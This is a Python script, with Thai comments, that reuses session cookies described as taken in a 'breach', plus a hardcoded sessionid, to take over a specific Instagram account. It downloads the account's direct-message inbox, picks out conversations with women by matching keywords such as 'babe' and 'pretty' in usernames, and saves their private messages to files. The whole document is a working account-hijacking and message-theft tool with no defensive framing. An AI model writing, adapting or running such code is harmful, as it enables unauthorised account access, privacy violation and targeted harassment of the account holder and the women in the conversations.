#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
💬 REAL DM EXTRACTOR WITH SESSION REUSE
ใช้ session ที่เจาะมาแล้วเพื่อดึง DM จริง
"""

import requests
import json
import time
from datetime import datetime
import os

class RealDMExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.username = "alx.trading"
        self.csrf_token = None
        self.session_cookies = {}
        
        # Headers ที่เหมือน browser จริง
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/direct/inbox/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
    
    def load_session_data(self):
        """📂 โหลดข้อมูล session ที่เจาะมา"""
        print("📂 Loading session data from breach results...")
        
        # ลอง session จากไฟล์ที่เจาะมา
        session_files = [
            'SUCCESSFUL_BREACH_alx_trading_Fleming654.json',
            'session.json',
            'breach_session.json'
        ]
        
        for file in session_files:
            if os.path.exists(file):
                try:
                    with open(file, 'r') as f:
                        data = json.load(f)
                    
                    print(f"✅ Found session file: {file}")
                    
                    # Extract cookies from breach results
                    if 'breach_results' in data:
                        breach_data = data['breach_results']
                        if 'cookies_extracted' in breach_data:
                            cookies = breach_data['cookies_extracted']
                            for name, value in cookies.items():
                                self.session.cookies.set(name, value, domain='.instagram.com')
                                print(f"   Cookie: {name}")
                        
                        if 'attack_details' in breach_data:
                            self.csrf_token = breach_data['attack_details'].get('csrf_token')
                            if self.csrf_token:
                                print(f"   CSRF: {self.csrf_token[:20]}...")
                    
                    # Extract direct session data
                    elif 'sessionid' in data:
                        self.session.cookies.set('sessionid', data['sessionid'], domain='.instagram.com')
                        print(f"   SessionID: {data['sessionid'][:20]}...")
                    
                    return True
                    
                except Exception as e:
                    print(f"❌ Failed to load {file}: {e}")
        
        # ถ้าไม่มีไฟล์ ให้ใช้ข้อมูลที่รู้
        print("⚠️ No session files found, using known credentials...")
        self.session.cookies.set('sessionid', '4976283726%3A1JgRzA56Q8e8Qs%3A12', domain='.instagram.com')
        self.session.cookies.set('ds_user_id', '4976283726', domain='.instagram.com')
        return True
    
    def get_csrf_token(self):
        """🔑 ดึง CSRF token"""
        if self.csrf_token:
            return True
        
        print("🔑 Getting CSRF token...")
        
        try:
            response = self.session.get('https://www.instagram.com/direct/inbox/')
            
            if response.status_code == 200:
                # หา CSRF จาก page
                import re
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                if csrf_match:
                    self.csrf_token = csrf_match.group(1)
                    print(f"✅ CSRF extracted: {self.csrf_token[:20]}...")
                    return True
                
                # หา CSRF จาก cookies
                for cookie in self.session.cookies:
                    if cookie.name == 'csrftoken':
                        self.csrf_token = cookie.value
                        print(f"✅ CSRF from cookie: {self.csrf_token[:20]}...")
                        return True
            
            print("❌ Could not get CSRF token")
            return False
            
        except Exception as e:
            print(f"❌ CSRF error: {e}")
            return False
    
    def test_session(self):
        """🧪 ทดสอบ session"""
        print("🧪 Testing session...")
        
        try:
            response = self.session.get('https://www.instagram.com/direct/inbox/')
            
            print(f"📡 Response status: {response.status_code}")
            
            if response.status_code == 200:
                if 'direct' in response.text and 'login' not in response.url:
                    print("✅ Session working! Can access direct messages")
                    return True
                else:
                    print("❌ Session expired - redirected to login")
                    return False
            else:
                print(f"❌ HTTP error: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Session test error: {e}")
            return False
    
    def get_inbox_threads(self):
        """📥 ดึงรายการ DM threads"""
        print("📥 Getting DM threads...")
        
        try:
            # API endpoints ที่อาจใช้ได้
            endpoints = [
                'https://www.instagram.com/api/v1/direct_v2/inbox/',
                'https://i.instagram.com/api/v1/direct_v2/inbox/',
                'https://www.instagram.com/api/v1/direct_v2/threads/',
            ]
            
            # Update headers with CSRF
            headers = self.headers.copy()
            if self.csrf_token:
                headers['X-CSRFToken'] = self.csrf_token
            
            for endpoint in endpoints:
                print(f"🔍 Trying: {endpoint}")
                
                response = self.session.get(endpoint, headers=headers)
                print(f"   Status: {response.status_code}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        # บันทึกข้อมูล
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        filename = f"real_dm_threads_{timestamp}.json"
                        
                        with open(filename, 'w', encoding='utf-8') as f:
                            json.dump(data, f, indent=2, ensure_ascii=False)
                        
                        print(f"✅ Threads data saved: {filename}")
                        return data
                        
                    except json.JSONDecodeError:
                        print(f"   Invalid JSON: {response.text[:200]}")
                        continue
                else:
                    print(f"   Error: {response.text[:200]}")
            
            print("❌ All endpoints failed")
            return None
            
        except Exception as e:
            print(f"❌ Inbox error: {e}")
            return None
    
    def get_thread_messages(self, thread_id, cursor=None):
        """💬 ดึงข้อความจาก thread"""
        print(f"💬 Getting messages from thread: {thread_id}")
        
        try:
            url = f"https://www.instagram.com/api/v1/direct_v2/threads/{thread_id}/"
            
            params = {}
            if cursor:
                params['cursor'] = cursor
            
            headers = self.headers.copy()
            if self.csrf_token:
                headers['X-CSRFToken'] = self.csrf_token
            
            response = self.session.get(url, headers=headers, params=params)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    
                    # บันทึกข้อมูล
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"real_dm_messages_{thread_id}_{timestamp}.json"
                    
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(data, f, indent=2, ensure_ascii=False)
                    
                    print(f"✅ Messages saved: {filename}")
                    return data
                    
                except json.JSONDecodeError:
                    print(f"❌ Invalid JSON: {response.text[:200]}")
                    return None
            else:
                print(f"❌ HTTP error: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Messages error: {e}")
            return None
    
    def analyze_threads(self, threads_data):
        """🔍 วิเคราะห์ threads และหาผู้หญิง"""
        print("🔍 Analyzing threads for women...")
        
        if not threads_data:
            print("❌ No threads data to analyze")
            return
        
        women_threads = []
        
        try:
            # หาข้อมูล threads
            inbox = threads_data.get('inbox', {})
            threads = inbox.get('threads', [])
            
            if not threads:
                print("❌ No threads found in data")
                return
            
            print(f"📊 Found {len(threads)} threads")
            
            for thread in threads:
                thread_id = thread.get('thread_id')
                users = thread.get('users', [])
                
                for user in users:
                    username = user.get('username', '')
                    full_name = user.get('full_name', '')
                    
                    # ตรวจสอบว่าเป็นผู้หญิงหรือไม่
                    if self.is_female_user(username, full_name):
                        women_threads.append({
                            'thread_id': thread_id,
                            'username': username,
                            'full_name': full_name,
                            'thread': thread
                        })
                        
                        print(f"👩 Found woman: {username} ({full_name})")
                        
                        # ดึงข้อความจาก thread นี้
                        messages = self.get_thread_messages(thread_id)
                        if messages:
                            print(f"   💬 Retrieved messages for {username}")
            
            # บันทึกผลลัพธ์
            if women_threads:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f"real_women_dm_analysis_{timestamp}.json"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(women_threads, f, indent=2, ensure_ascii=False)
                
                print(f"\n✅ Women DM analysis saved: {filename}")
                print(f"👩 Total women found: {len(women_threads)}")
                
                for woman in women_threads:
                    print(f"   • {woman['username']} ({woman['full_name']})")
            else:
                print("❌ No women found in DM threads")
                
        except Exception as e:
            print(f"❌ Analysis error: {e}")
    
    def is_female_user(self, username, full_name):
        """👩 ตรวจสอบว่าเป็นผู้หญิง"""
        female_keywords = [
            'girl', 'lady', 'woman', 'princess', 'queen', 'baby', 'babe',
            'cute', 'pretty', 'beauty', 'angel', 'sweet', 'lovely', 'miss',
            'mrs', 'ms', 'she', 'her', 'female'
        ]
        
        text = (username + ' ' + full_name).lower()
        
        for keyword in female_keywords:
            if keyword in text:
                return True
        
        return False
    
    def run_extraction(self):
        """🚀 เริ่มการดึง DM จริง"""
        print("💬 REAL DM EXTRACTOR WITH SESSION REUSE")
        print("=" * 60)
        print(f"👤 Target: {self.username}")
        print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        
        # โหลด session
        if not self.load_session_data():
            print("❌ Failed to load session data")
            return False
        
        # ดึง CSRF token
        self.get_csrf_token()
        
        # ทดสอบ session
        if not self.test_session():
            print("❌ Session not working")
            return False
        
        # ดึง DM threads
        threads_data = self.get_inbox_threads()
        
        if threads_data:
            # วิเคราะห์หาผู้หญิง
            self.analyze_threads(threads_data)
            print("\n🎉 DM extraction completed!")
            return True
        else:
            print("❌ Could not get DM data")
            return False

def main():
    print("💬 REAL DM EXTRACTOR")
    print("🔥 Using existing session data from breach")
    print("=" * 50)
    
    extractor = RealDMExtractor()
    
    if extractor.run_extraction():
        print("\n✅ SUCCESS: Real DM data extracted!")
    else:
        print("\n❌ FAILED: Could not extract DM data")

if __name__ == "__main__":
    main()
